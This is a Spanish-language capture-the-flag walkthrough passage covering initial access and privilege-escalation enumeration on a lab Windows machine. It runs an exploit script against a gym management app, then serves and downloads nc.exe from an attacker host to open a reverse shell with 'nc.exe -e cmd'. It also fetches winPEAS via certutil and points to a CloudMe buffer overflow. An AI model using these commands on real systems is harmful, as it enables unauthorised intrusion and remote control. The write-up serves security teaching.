## Vuln exploit & Gaining Access {-}

### Conneccion por gym management {-}

```bash
python gym_management.py http://10.10.10.198:8080/
```

Ya estamos en la maquina victima. Pero estamos con una web shell. 

### Reverse Shell {-}

En la maquina de attackante enviamos un nc.exe a la maquina victima para tener una shell interactiva

```bash
locate nc.exe
cp /opt/SecLists/Web-Shells/FuzzDB/nc.exe .
python -m http.server 80
```

Con otra terminal, nos ponemos en escucha por el puerto 443

```bash
rlwrap nc -nlvp 443
```

desde la maquina victima, lo descargamos y lo ejecutamos

```bash
curl http://10.10.14.8/nc.exe -o nc.exe
./nc.exe -e cmd 10.10.14.8 443
```


Si le hacemos un type `C:\users\shaun\Desktop\user.txt` podemos ver la flag.

### Analyzando la maquina {-}

```bash
whoami
whoami /priv
whoami /all
```

Como no vemos nada interressante aqui, lanzaremos un binario que nos permitta enumerar el systema para
encontrar vias potenciales para escalar privilegios. Vamos a utilizar el **winpeas**

#### Analysis de vulnerabilidad Privesc con WINPEAS {-}

```bash
cd c:\Windows\Temp
mkdir EEEE
cd EEEE
```

Descargamos el `winpeasx64.exe` desde [https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASx64.exe).

```bash
cd content
cp /home/s4vitar/Descargas/firefox/winPEASx64.exe .
python3 -m http.server 80
```

Lo descargamos desde la maquina victima y lo lanzamos.

```bash
certutil.exe -f -urlcache -split http://10.10.14.8/winPEASexe.exe winPEAS.exe
winPEAS.exe
```

En la parte `Searching executable files in non-default folders with write (equivalent) permissions` vemos que
el ususario shaun tiene AllAccess al ejecutable `C:\Users\shaun\Downloads\CloudMe_1112.exe`. Mirando por internet 
vemos que CloudMe es un servico que occupa el puerto **8888**. Lo comprobamos con `netstat`

A demas buscamos con searchsploit y vemos que este binario es vulnerable a un BufferOverflow.

